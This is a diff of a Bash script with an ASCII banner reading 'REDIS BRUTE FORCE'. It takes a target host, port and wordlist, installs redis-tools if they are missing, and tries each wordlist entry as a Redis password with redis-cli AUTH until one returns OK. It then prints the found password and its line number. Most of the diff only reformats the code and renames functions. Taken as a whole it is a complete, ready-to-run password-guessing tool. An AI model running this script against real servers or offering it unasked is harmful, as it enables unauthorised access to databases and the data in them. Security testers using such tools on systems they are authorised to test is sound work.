@@ -44,106 +44,107 @@ declare -r BOX4="$WHITE$VAR1$BLUE$VAR4$WHITE$VAR2$END"
 
 trap ctrl_c INT
 
-function check(){
-                which redis-cli > /dev/null 2>&1
-        if [ "$(echo $?)" == "0" ]; then
-                :
-        else
-                echo ""
-                echo -e "$BOX2 $REDEXIT$VAR17 $WHITE$VAR20$END"
-                echo ""
-                sleep 2
-                echo -e "$BOX1 $WHITE$VAR27$END"
-                apt-get install redis-tools -y &>/dev/null
-                sleep 2
-                return
-        fi
+function dependencies(){
+    which redis-cli > /dev/null 2>&1
+  if [ "$(echo $?)" == "0" ]; then
+    :
+  else
+    echo ""
+    echo -e "$BOX2 $REDEXIT$VAR17 $WHITE$VAR20$END"
+    echo ""
+    sleep 2
+    echo -e "$BOX1 $WHITE$VAR27$END"
+    echo ""
+    apt-get install redis-tools -y &>/dev/null
+    sleep 2
+    return
+  fi
 }
 
 function banner(){
-        echo -e "$GREEN"
-        echo -e "  ██████╗░██████╗░███████╗"
-        echo -e "  ██╔══██╗██╔══██╗██╔════╝"
-        echo -e "  ██████╔╝██████╦╝█████╗░░"
-        echo -e "  ██╔══██╗██╔══██╗██╔══╝░░"
-        echo -e "  ██║░░██║██████╦╝██║░░░░░"
-        echo -e "  ╚═╝░░╚═╝╚═════╝░╚═╝░░░░░$END"
-        echo -e "$WHITE$VAR22$END"
-        echo -e "$WHITE$VAR13  $RED REDIS $WHITE$VAR7$RED BRUTE $WHITE$VAR7$RED FORCE   $WHITE$VAR13$END"
-        echo -e "$WHITE$VAR22$END"
+  echo ""
+  echo -e "$GREEN  ██████╗░██████╗░███████╗$END"
+  echo -e "$GREEN  ██╔══██╗██╔══██╗██╔════╝$END"
+  echo -e "$GREEN  ██████╔╝██████╦╝█████╗░░$END"
+  echo -e "$GREEN  ██╔══██╗██╔══██╗██╔══╝░░$END"
+  echo -e "$GREEN  ██║░░██║██████╦╝██║░░░░░$END"
+  echo -e "$GREEN  ╚═╝░░╚═╝╚═════╝░╚═╝░░░░░$END"
+  echo -e "$WHITE$VAR22$END"
+  echo -e "$WHITE$VAR13  $RED REDIS $WHITE$VAR7$RED BRUTE $WHITE$VAR7$RED FORCE   $WHITE$VAR13$END"
+  echo -e "$WHITE$VAR22$END"
 }
 
-function main(){
-        echo ""
-        echo -e "$BOX3 $RED$VAR12 $WHITE$VAR9 -t $RED$VAR6$WHITE$VAR10$RED$VAR5$WHITE -p $RED$VAR6$WHITE$VAR11$RED$VAR5$WHITE -w $RED$VAR6$WHITE$VAR26$RED$VAR5$WHITE$END"
-        echo ""
+function help(){
+  echo ""
+  echo -e "$BOX3 $RED$VAR12 $WHITE$VAR9 -t $RED$VAR6$WHITE$VAR10$RED$VAR5$WHITE -p $RED$VAR6$WHITE$VAR11$RED$VAR5$WHITE -w $RED$VAR6$WHITE$VAR26$RED$VAR5$WHITE$END"
+  echo ""
 }
 
 function info(){
-        sleep 1
-        echo -e " $BOX4 $WHITE$VAR23   $BLUE$TARGET$WHITE$VAR25$BLUE$PORT$END"
-        sleep 1
-        echo -e " $BOX4 $WHITE$VAR14 $BLUE$WORDLIST$END"
-        sleep 1
-        echo -e " $BOX3 $WHITE$VAR21$END"
-        sleep 1
+  sleep 1
+  echo -e " $BOX4 $WHITE$VAR23   $BLUE$TARGET$WHITE$VAR25$BLUE$PORT$END"
+  sleep 1
+  echo -e " $BOX4 $WHITE$VAR14 $BLUE$WORDLIST$END"
+  sleep 1
+  echo -e " $BOX3 $WHITE$VAR21$END"
+  sleep 1
 }
 
 function ctrl_c(){
-        echo ""
-        exit 1
+  echo ""
+  exit 1
 }
 
 while getopts ":t:p:w:" arg; do
-        case $arg in
-                t) TARGET=$OPTARG; let parameter_counter+=1 ;;
-                p) PORT=$OPTARG; let parameter_counter+=1 ;;
-                w) WORDLIST=$OPTARG; let parameter_counter+=1 ;;
-        esac
+  case $arg in
+    t) TARGET=$OPTARG; let parameter_counter+=1 ;;
+    p) PORT=$OPTARG; let parameter_counter+=1 ;;
+    w) WORDLIST=$OPTARG; let parameter_counter+=1 ;;
+  esac
 done
 
 if [ ! -z $TARGET ]; then
-        check
-        banner
+  dependencies
+  banner
 else
-        check
-        banner
-        main
-        exit 0
+  dependencies
+  banner
+  help
+  exit 0
 fi
 
 if [ ! -z $PORT ]; then
-        :
+  :
 else
-        main
-        exit 0
+  help
+  exit 0
 fi
 
 if [ ! -z $WORDLIST ]; then
-        info
+  info
 else
-        main
-        exit 0
+  help
+  exit 0
 fi
 
-lines=$(/usr/bin/wc -l $WORDLIST)
-regex="([0-9]+).$WORDLIST"
-[[ $lines =~ $regex ]]
-siz="${BASH_REMATCH[1]}"
+LINES=$(wc -l $WORDLIST)
+REGEX="([0-9]+).$WORDLIST"
+[[ $LINES =~ $REGEX ]]
+SIZ="${BASH_REMATCH[1]}"
 
 while read PASSWORD; do
-                line=$((line + 1))
-                progress=$((line * 100 / siz))
-                echo -ne "\r$YELLOW     $line/$siz/$progress%/$PASSWORD                                                 $END"
-                redis-cli -h $TARGET -p $PORT AUTH "$PASSWORD" | grep "OK" &>/dev/null
-        if [ $? -eq 0 ]; then
-                sleep 2
-                F1=$(/usr/bin/cat $WORDLIST | /usr/bin/grep "^$PASSWORD$" -n | /usr/bin/cut -d ":" -f 1)
-                echo -e "\n $BOX1 $RED$VAR15 $GREEN$PASSWORD$RED $VAR16 $GREEN$F1$END"
-                echo ""
-                sleep 2
-                exit 0
-        fi
+    LINE=$((LINE + 1))
+    PROGRESS=$((LINE * 100 / SIZ))
+    echo -ne "\r$YELLOW     $LINE/$SIZ/$PROGRESS%/$PASSWORD                                                 $END"
+    redis-cli -h $TARGET -p $PORT AUTH "$PASSWORD" | grep "OK" &>/dev/null
+  if [ $? -eq 0 ]; then
+    sleep 2
+    F1=$(/usr/bin/cat $WORDLIST | grep "^$PASSWORD$" -n | cut -d ":" -f 1)
+    echo -e "\n $BOX1 $RED$VAR15 $GREEN$PASSWORD$RED $VAR16 $GREEN$F1$END"
+    echo ""
+    sleep 2
+    exit 0
+  fi
 done < $WORDLIST
 echo -e "\r $BOX2 $RED$VAR18 $WHITE$VAR19$END"
 echo ""
